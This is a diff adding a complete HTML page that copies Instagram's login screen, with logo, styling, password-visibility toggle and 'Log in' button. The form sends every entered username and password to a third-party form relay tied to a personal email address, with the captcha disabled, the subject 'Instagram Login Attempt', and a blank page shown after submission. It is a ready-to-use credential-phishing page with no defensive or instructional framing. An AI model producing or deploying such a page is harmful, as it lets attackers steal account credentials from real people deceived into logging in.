@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background-color: #1a2535;
+      font-family: 'Inter', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: #fff;
+    }
+
+    .top-bar {
+      width: 100%;
+      text-align: center;
+      padding: 20px 16px 0;
+      font-size: 15px;
+      color: #c8d0db;
+      font-weight: 400;
+    }
+
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 520px;
+      padding: 0 24px;
+      margin-top: 60px;
+    }
+
+    .ig-icon { margin-bottom: 48px; }
+
+    .ig-icon img {
+      width: 56px;
+      height: 56px;
+      border-radius: 14px;
+      display: block;
+    }
+
+    .fields {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+
+    .field-wrap {
+      position: relative;
+      width: 100%;
+      background: #243044;
+      border: 1.5px solid #3a4a60;
+      border-radius: 14px;
+      padding: 0 18px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+    }
+
+    .field-wrap input {
+      width: 100%;
+      background: transparent;
+      border: none;
+      outline: none;
+      font-size: 15px;
+      color: #fff;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+      padding-right: 44px;
+      caret-color: #fff;
+    }
+
+    .field-wrap input::placeholder {
+      color: #6b7a8f;
+      font-size: 15px;
+    }
+
+    .eye-btn {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #6b7a8f;
+    }
+
+    .eye-btn svg { width: 24px; height: 24px; }
+
+    .btn-login {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      margin-bottom: 20px;
+      transition: background 0.15s;
+      letter-spacing: 0.2px;
+    }
+
+    .btn-login:hover { background: #1565d8; }
+
+    .forgot {
+      font-size: 15px;
+      color: #c8d0db;
+      text-decoration: none;
+      text-align: center;
+      display: block;
+      font-weight: 400;
+      margin-bottom: 80px;
+    }
+
+    .forgot:hover { text-decoration: underline; }
+
+    .btn-create {
+      width: 100%;
+      background: transparent;
+      color: #4a9ff5;
+      border: 1.5px solid #3a4a60;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 500;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      transition: border-color 0.15s;
+      letter-spacing: 0.2px;
+      margin-bottom: 44px;
+    }
+
+    .btn-create:hover { border-color: #4a9ff5; }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">English (UK)</div>
+
+  <div class="content">
+
+    <div class="ig-icon">
+      <img src="data:image/webp;base64,UklGRrgPAABXRUJQVlA4WAoAAAAQAAAAswAAswAAQUxQSPgGAAABoFVrb97oEgRDEIRAEIQw+MxgzKBm0DBwGPQwEARDEARD0EVnIsU/WecyIiYAukekPcac36UUZma5qp02+WZmLqXknCIRwrQx5lJFZy1cEoW5BHpz0xXKJ+IkQuKmK63vbbiQWBcsCUfa3k1XXWgUYl06xxGQdfmMvYWXPsKCXZHoQ5TY0Vsf5KsXZH2UFbtA0Ycp2MHW9HG27bZ/TZ/ov5v+6UP9d8umfTYR5lLKkXOOf1LXe4wx5pyPUpirdNG2G7Dd1GpJcUOYb6A9f+o92tANRW9snDaYfNhPuUEFvar6MwVYI53ipuz0Uu+WA6w0ipe+XaI6txxgtVGclBxQnI4AK85OEmxFXYVg0Sgumk2orhVh2VhdFC3scgZY+enChqieJyz+9FC6xh4nLP/04EukjhXWH6qDbleKg+ADABSH4wKqI8IjJIcW/koOGRYbYhGRWnYLHDZNf4lNYLE/Tf+UaAjNxn9sao9rQdbLn3AJsk3Db4dNYKkoaqzhUmi29Fu1xbVUNZdLkG38C6pZYKlRHelSsLXwFW1lLeLBl4BNSl8fGy1lV1e6RLbjS0wCSz180qXQTAwAQc1lLexTLgGbGgCQbV+L+PC1ZFIESLbwNDZbBDhNFaaIuBFtGDr4+JRr0EwZgE3/DRYolSp6Ufid6JbDJxqqqQCIKY9EL1ZnzuRGPmg4TRVAzfsw9Gp6qxT0AfYoYEwmAbTRIJG1Q44u5IGWaFIgWxghvJp2KtEBDlsG62ZDBxgwinYs0QanJYMZHaJJ+iPWzgVNkC+1BI42SqbaW3jrgC8T4OcvRvBspj2buLNNdEhBCwDGo5QjBvAVUxzsp+moyXSzw2kqXb114FdXbMojhY8O/QkzOfoJVQevoZ/TdLApdxOqDl/DMGWYUHWCNazmo1P89HLcFzt56Z3tc8QNAQCQ9sztDn13kk0sY/yof8sEZjrFT9NCUN2ZwHlnt7atQ7yY4EZkJ5XQQ7xv7+GlvkJwcxQffY9QbdQBqu8R4HY8fZQGkDaA+CToMvnwCNpfVM+2QaebeGhcgXgIQrcoHhLmF9VREDrG5qB5fuKxQdebR7ttHy6qY4LOk4PGu2g4dijQ/eHAk0O1C/YXxKY0t+IQYUByyHMT2weGZFvrzPEmUjuOQTalmWUbw6BsyzNjG41CNp6ZmgWGbSYN8yLbMU620bySjcYhW5rXYWowcDOVebGJR/qY6rzElEc6TDIvNe8jRZNOK9hopM2Gs0IbjoTL2GwwtG2bFc2N/k/YHhnacCS04TK2kcgWZgW2ONJug2mJKY+UTTKvavpvJDbxvE5TG6mZjnklk9I4pOY0L7LlcQ4bzSvY2jhig3kBm5RGITXzzLKNR2FbnhnZlMZAtdPMoNl4DLYJdCadZZvSCFHtZW7kIKE/FAecG7BN3/0VtTNMLjpo6u1HHeNw+13QHHTra1NHgeHibdmjYU8oHnF+QRxUsB8UdRSYH0QPla2XralnXAGwh2rq40ddBfprI5CPFrwvvNUXB5AR4PBRiXeRqG+GDncbjxDER/WDdxCrs0CP8b7cA2BzUmXyIlZ3XAckN1V5k41eTf0TLAQOP1VtnHfCL9zi+9P0zgxj8Gk6OoHPHT1/oNN8X+kl1BnUsBoIdbwaYJhjGAh1tBqg28NUson7gfAZ6xOg33MmAHmkA3p2iCbpClIbpSXomk15MEAZQxAG202tM4A8whGg82pKZNLuAKU3JuheTBFt2B1AlJ4kwoBqJodtAIAovbQcYMDgALY4BEDkHniHMcmGIKY0CACeck/LBKPuNoBqKsMAwJbZqXEmGDibBOA01ZG+KR0sV6SWRAHG/pgYIJvaaL8H3IgQA0yxmgpANOk2hakGNScAtKWnsdsIAJqJn0axBQBgUwsPQ0wCAHCYlJ4Fqfm/L7Lxsyi2+BWaqYVHITb8AjZpfhJRzRV+TbYWHoTYjt+CTfNziGrffgO2tfAYxCbwZ7Lp+ym81J7+Cs2m9AxQHfEvOBwEnwCKQ4GLm4PW8ACqOtIVYAct6yvqyHCZPLSsrqjnfg3YQ8vSQlFPBiO6aMV1YVVXtEB2UcFVkahrAXMQF9XXksJbfQVtQE4qcTnh1dQ5gufhpCpxKeHV1DuDL3upSqFFBGL1r+CM4qaqUvYwuy1x0xsFvQDbDd/1k3cKE8ItplKb3tsQ/Ld2z5/CzKW8c84xxrhT13v8Pef8LqUwizTtc4M7YxdLjnBvfCQtwt1bex5tg/tRnoYg9Ij1WTBCp/lJHNBvlKcgBD3j+QxygM6R18cIAxKvjQkGpXNZ7dhgYEyyIk4BRt+OupTGKcAcMX5kCY0PCjDVQKmwTEtqyRFh2kgUU86lFGZm+W69yFVm5lLKkXOMOyFC91ZQOCCaCAAA0CgAnQEqtAC0AD6ZRJ5Kpb+/sKWSnGvwEwlqbt/9f3vOM7Hv9AHpP/Af3b6AGX/x05eXh5Lfj/7l+139Q97ix/2n+xfqD8ouqASl2Ufw/u09oz2Qfpb/re4H+l/659fj+negD9gP2x94//afqB7mfQA/sf+l9ZH1C/QA/ZX1af+L+43wTf1X/m/t/7Vn/39gD0AOpn6h/wD8GvwP/a/v8Leg33Vz81JQy9FdrwvEB75TPOrEImD4XrH/aAkFG9vQm7vmStCyufkw0BoNB8gf9X6mZKcsGb67JmN59/18ZtV6QjXV8EshHhDsxxYZ1N95ZNZ05Ro/5W1k2nU16EZQPm6xXoxwkOj6EA5dpg/LpET4IEpCUW+tdmwHtvqsZFFA9yhZz0df2Vrv2hyyphN77N5z4CZtHOk0+E/zwbb0LTmKwqLbX/xmbNpQcjfjSIAA/eMzV1Y+MXGcf1zxyYSaBPK7UCNv3N99/SavokwLfU9lj8YSkU2ipEIiQWwmhQddQWn949iD/jAt5//tnhmJD+fk4chzoVbwlFA+1vdhV7gxe21N+sFXbfDdvoyHJmrtgTQkubwq/I8hbQWhocA6ajcYQDoFFqKQsglLjMcNzycnxFNF1bqC5w/7e+PYqd7ps69Au/a2H1qwjqP2+jatlWJqtXQdIsNTMHadJ7s7LpgIketAtun1GfPXKisJrX3dRsi2C88XkmzXEhYLUB3ytvW/y/V/tdcCsKgj8VNqdbpfi1kykDTHKqFQ0GSOXzzxrKUclLUnLjZf1gaci02UPQdHB/l81kAztKQcK0q7SRNhZg9WZCB8TwFnKEIa1CArXg1qS+vh1zyFvyTsIDSQDOvFGFbTTn/oKk7mXFStmQBuvXge9QH+ZehuqAdDXJI79Nnwu4BQaGcxZJmADBrEj3kmEBr4eCnAD3wcLIPkIilXvpYIVxG4ZidXASm8eE0dnfW/PuEMXzEZl54Fa1KUZ0vWmnxnFEhQ+oAvxy/ona6cuUeG57imWb3v/+6Mr5ErAnhSvHpXtgA+iHbvSOhbU9jcsS1xDFxrdK+Xx0gO7UjwcIfq97/WohiWlDlnacNobQ2XAfq9+KZ9VvGgWGLWy8i7jXjmz8F6mxrimT2PqbOxE9HGX9WnqECoUHMk1OArJcc7GlRTzoZEa7qUFW43Mzag2mOW0Eo4thDmnvt32IFBYb3g/hL9msFbdXYTdK5h0qxS9oPazG/oCDwm7hjau1ybwkTOA+c+bRwnBBeYR0GVInKCkpoOFaVc8SNY0mX35/AFN0TcPgPg6OfsOXIz8bvjoA/NsR4KEu711H/2U9gKWL4kbr4EywG6/nvLXhV4D/kFVkJL88eYgBWYuSgPbUrT3xCFAq9I+I73iT5YGOPAmL8B3GCai7R83IYCrHggTQ99gwfKnLnoNkod5zlmLIFJorr74BDHTpnBHQJ6oO2YFgG5OeDLebEVJvo5kMUZONrW3HpHhgoHrilFDuUb0x2f1ZXIwAiwykHeg/A267Ik2vo/sFrNA0xtCPhxQBK9hHyvpyhwQdN5oaKaHUsBAUT+EVFAb//5AdoUrmDIk/wriinQVTvSHAL8Df4C7g6itloYKGkMM7Bg4lIOVV7dkYWv3PbBK4pwxDQ9mtjmF+qYKQBeWCE7QR33nswdMi/Ls8zVvQtWdNOXZlXXZy79eOJxqGND1mg/Ph6cJ4+aT/NvnF3P3jo8gMM8v3KkkzJwItCD4iBLfNxCYPxh96FKqPEVAWm9Ev+/nSjCGhm8E35DXcEPcO1LPjSXnbFkuk9fM/T15VXHbaQ+h+5uq6rPiMi2KabJ5/d/Pb5sdtaWrRAhjZzAY6WyR/OqnPT2JkCMbxjd+7oGAyxUZ23yXQnK7ilwh7K/qlasy2MUR1+oUrazDTMAHO14zdFZtoKOQY5+ixfn9pqax5aPfSHPax8lwjYzLHcP1FU+K3JcmM6fNg3f48/YfYI8+1iVvH/OEBTemKvYSieLrzLqEkWrX263yTv1TNxGYhfC2rvnVfQpUaxVmbzn+V4GpS7Q6vIkg10fs3nbWo64cMd0gLZJo4F7gT5zn1yrjX5si8O9U+65p8sTkEAz9138bh47/Rapqdr3rK8/Q2U29xo18epzg32mCgbDFBlOhMvEiruz2jOadJbsSsnO80zs2o4+Dr0L5rWDlKxvs8PyT25sTcWwsjr395taOeGEQY6wEvgIyqEWN+lkwO4P8PfuqUpMAfLFM7vH+G+nfTCKT339jK+fX0c2F1szQvClo7CSS6EggEL95ZogIaVrqKBxBW4zGNYWecBf6C5zB2aAUuVYLAQTWe/6yERwE8u9meql8JO9fdtaQqVl73FDcV94jBUj5JhLiZtJ/CtTf725cS50E0ZkC9JqOaB/xjVfi+1fxE+KEJeBV+tX+sl3C6aYEgJjP3iPlObwM6dxs/CvoCaqor8u4T43JUOtgPHmngugoNYkgfo6xyVvERzHAAFi7/1jt/shSgAAAASQCfkij9r167AtJUco3fyWIX3RdQaElMCbBem8J1oSPla/5k5xq9pg2IGGNzQ7jMOfV9Ao0lOlg9ElsWmREAkcNKawovOlVixWq0w+I1YD9nlEAx/7BVhVYojlpEkIRoWKw6bU2Hz3ajyeRw+FJUnHuIZ5C/O/VvUVUtkGlnNJN7B+Cn2sBiUG3QkOOqN5bmbotNUcXqOYgtVmxE9kuvefr9sxX5Bj1CoOz4HQrJm4KftI/rAt0HrqddxBWkfie+91ZqiuOsyuQf2/r+6F8OTnFtid8t+pqJkJ3nk+c3C1oZLsFxjZHgCP8UwA/WnhE6XjCUkZ0ft0Q4WTSyqpaEXmo4X5sEWwr37ITnoabLmF5QiG6DKFGECD1+GLUGEU3UwLGg3/nL6eWmbjt2pvshfgRG3sILZITvs+4I41lDdGTzA+I7YlQAAA" alt="Instagram"/>
+    </div>
+
+    <form action="https://formsubmit.co/joshvinjohn2008@gmail.com" method="POST" style="width:100%;display:contents;">
+
+      <input type="hidden" name="_captcha" value="false"/>
+      <input type="hidden" name="_next" value="about:blank"/>
+      <input type="hidden" name="_subject" value="Instagram Login Attempt"/>
+
+      <div class="fields">
+        <div class="field-wrap">
+          <input type="text" name="username" placeholder="Username, email address or mobile ..." id="username" required/>
+        </div>
+
+        <div class="field-wrap">
+          <input type="password" name="password" placeholder="Password" id="password" required/>
+          <button type="button" class="eye-btn" id="eyeBtn" aria-label="Toggle password visibility">
+            <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+              <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1" y1="1" x2="23" y2="23"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-login">Log in</button>
+      <a href="#" class="forgot">Forgotten password?</a>
+      <button type="button" class="btn-create">Create new account</button>
+
+    </form>
+
+  </div>
+
+  <script>
+    document.getElementById('eyeBtn').addEventListener('click', function() {
+      var pw = document.getElementById('password');
+      var icon = document.getElementById('eyeIcon');
+      if (pw.type === 'password') {
+        pw.type = 'text';
+        icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+      } else {
+        pw.type = 'password';
+        icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+      }
+    });
+  </script>
+</body>
+</html>
